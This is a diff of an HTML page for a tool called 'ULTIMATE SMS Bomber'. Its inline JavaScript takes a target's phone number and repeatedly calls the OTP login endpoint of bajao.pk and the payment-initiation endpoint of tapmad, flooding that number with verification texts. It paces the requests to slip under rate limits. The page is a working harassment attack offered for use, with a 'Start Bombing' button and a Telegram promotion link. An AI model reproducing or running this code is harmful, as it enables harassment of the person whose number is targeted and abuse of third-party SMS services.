@@ -4,38 +4,274 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ULTIMATE SMS Bomber - Developed by RAMZAN AHSAN</title>
-    <link rel="stylesheet" href="css/style.css">
-    <script src="js/anti-scrape.js" defer></script>
-    <script src="js/app.js" defer></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #121212;
+            color: #fff;
+            text-align: center;
+        }
+        
+        h1 {
+            color: #ff5555;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            color: #aaa;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        input {
+            padding: 10px;
+            width: 100%;
+            max-width: 300px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background-color: #222;
+            color: #fff;
+            margin-bottom: 10px;
+        }
+        
+        button {
+            background-color: #ff5555;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 0 10px rgba(255, 85, 85, 0.5);
+        }
+        
+        button:hover {
+            background-color: #ff3333;
+            box-shadow: 0 0 20px rgba(255, 85, 85, 0.8);
+            transform: scale(1.05);
+        }
+        
+        #status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .telegram-btn {
+            display: inline-block;
+            margin-top: 30px;
+            padding: 10px 20px;
+            background-color: #0088cc;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: all 0.3s;
+            box-shadow: 0 0 10px rgba(0, 136, 204, 0.5);
+        }
+        
+        .telegram-btn:hover {
+            background-color: #006699;
+            box-shadow: 0 0 20px rgba(0, 136, 204, 0.8);
+            transform: scale(1.05);
+        }
+        
+        .glow {
+            animation: glow 2s infinite alternate;
+        }
+        
+        @keyframes glow {
+            from {
+                box-shadow: 0 0 5px rgba(255, 85, 85, 0.5);
+            }
+            to {
+                box-shadow: 0 0 20px rgba(255, 85, 85, 0.8);
+            }
+        }
+        
+        .counter {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #aaa;
+        }
+        
+        .progress-container {
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
+            background-color: #222;
+            border-radius: 5px;
+            padding: 3px;
+        }
+        
+        .progress-bar {
+            height: 20px;
+            border-radius: 3px;
+            background-color: #4CAF50;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        .batch-info {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #888;
+        }
+        
+        .stop-btn {
+            background-color: #333;
+            margin-left: 10px;
+        }
+        
+        .timer {
+            font-size: 18px;
+            margin-top: 10px;
+            color: #ff5555;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1><img src="assets/logo.png" alt="Logo"> ULTIMATE SMS BOMBER</h1>
-        <div class="subtitle">Developed by RAMZAN AHSAN</div>
-        
-        <div class="input-group">
-            <input type="text" id="phone" placeholder="Enter phone number (923xxxxxxxxx)" pattern="923[0-9]{9}" required>
-        </div>
-        
-        <div class="input-group">
-            <input type="number" id="count" placeholder="Total OTPs to send (1-100)" min="1" max="100" required>
-        </div>
-        
-        <div class="button-group">
-            <button id="bombBtn" class="glow">Start Bombing</button>
-            <button id="stopBtn" class="stop-btn" disabled>Stop</button>
-        </div>
-        
-        <div class="progress-container">
-            <div class="progress-bar" id="progress"></div>
-        </div>
-        
-        <div id="status">Ready to bomb</div>
-        <div id="counter" class="counter"></div>
-        
-        <a href="https://t.me/Tips0Courses" class="telegram-btn" target="_blank">
-            Join Telegram Channel
-        </a>
+    <h1>ULTIMATE SMS BOMBER</h1>
+    <div class="subtitle">Developed by RAMZAN AHSAN</div>
+    
+    <div class="input-group">
+        <input type="text" id="phone" placeholder="Enter phone number (923xxxxxxxxx)" pattern="923[0-9]{9}" required>
     </div>
+    
+    <div class="input-group">
+        <input type="number" id="count" placeholder="Total OTPs to send (1-100)" min="1" max="100" required>
+    </div>
+    
+    <div>
+        <button onclick="sendOTP()" class="glow" id="bombBtn">Start Bombing</button>
+        <button onclick="stopBombing()" class="stop-btn" id="stopBtn" disabled>Stop</button>
+    </div>
+    
+    <div class="progress-container">
+        <div class="progress-bar" id="progress"></div>
+    </div>
+    
+    <div id="status">Ready to bomb</div>
+    <div id="counter" class="counter"></div>
+    <div id="batchInfo" class="batch-info"></div>
+    <div id="timer" class="timer"></div>
+    
+    <a href="https://t.me/Tips0Courses" class="telegram-btn" target="_blank">
+        Join Telegram Channel
+    </a>
+
+    <script>
+        let isBombing = false;
+        let totalRequested = 0;
+        let totalSent = 0;
+        let totalSuccess = 0;
+        let totalFailures = 0;
+        let stopRequested = false;
+
+        async function sendOTP() {
+            if (isBombing) return;
+            
+            const phone = document.getElementById('phone').value.trim();
+            const count = parseInt(document.getElementById('count').value);
+            const status = document.getElementById('status');
+            const progress = document.getElementById('progress');
+            const counter = document.getElementById('counter');
+
+            if (!phone || isNaN(count) || count < 1 || count > 100) {
+                alert('📵 Please enter a valid phone number and OTP count between 1–100.');
+                return;
+            }
+
+            // Initialize
+            isBombing = true;
+            stopRequested = false;
+            totalRequested = count;
+            totalSent = 0;
+            totalSuccess = 0;
+            totalFailures = 0;
+            
+            const bombBtn = document.getElementById('bombBtn');
+            const stopBtn = document.getElementById('stopBtn');
+            bombBtn.disabled = true;
+            stopBtn.disabled = false;
+            
+            status.innerText = '🔄 Sending OTPs...';
+            status.style.color = '#FFC107';
+            status.style.backgroundColor = 'rgba(255, 193, 7, 0.2)';
+            progress.style.width = '0%';
+            counter.innerText = `Sent: 0/${count} | Success: 0 | Failed: 0`;
+
+            try {
+                for (let i = 0; i < count; i++) {
+                    if (stopRequested) break;
+                    
+                    const url = i % 2 === 0
+                        ? `https://bajao.pk/api/v2/login/generatePin?uuid=${phone}`
+                        : `https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage`;
+
+                    const options = i % 2 === 1 ? {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'accept': 'application/json' },
+                        body: JSON.stringify({
+                            Version: 'V1',
+                            Language: 'en',
+                            Platform: 'web',
+                            ProductId: 1733,
+                            MobileNo: phone,
+                            OperatorId: '100007',
+                            URL: 'https://www.tapmad.com/sign-up',
+                            source: 'organic',
+                            medium: 'organic'
+                        })
+                    } : { method: 'POST' };
+
+                    try {
+                        await fetch(url, options);
+                        totalSuccess++;
+                        status.innerText = `✅ Sent ${i + 1} of ${count}`;
+                    } catch (error) {
+                        totalFailures++;
+                        status.innerText = `⚠️ Failed to send OTP ${i + 1}`;
+                    } finally {
+                        totalSent = i + 1;
+                        progress.style.width = `${(totalSent/count)*100}%`;
+                        counter.innerText = `Sent: ${totalSent}/${count} | Success: ${totalSuccess} | Failed: ${totalFailures}`;
+                        
+                        // Add delay between requests to avoid rate limiting
+                        if (i < count - 1 && !stopRequested) {
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                        }
+                    }
+                }
+
+                if (!stopRequested) {
+                    status.innerText = '✅ All OTPs Sent Successfully!';
+                    status.style.color = '#4CAF50';
+                    status.style.backgroundColor = 'rgba(76, 175, 80, 0.2)';
+                }
+            } finally {
+                isBombing = false;
+                bombBtn.disabled = false;
+                stopBtn.disabled = true;
+            }
+        }
+
+        function stopBombing() {
+            if (isBombing) {
+                stopRequested = true;
+                document.getElementById('status').innerText = '⏹ Stopping bombing...';
+            }
+        }
+    </script>
 </body>
 </html>
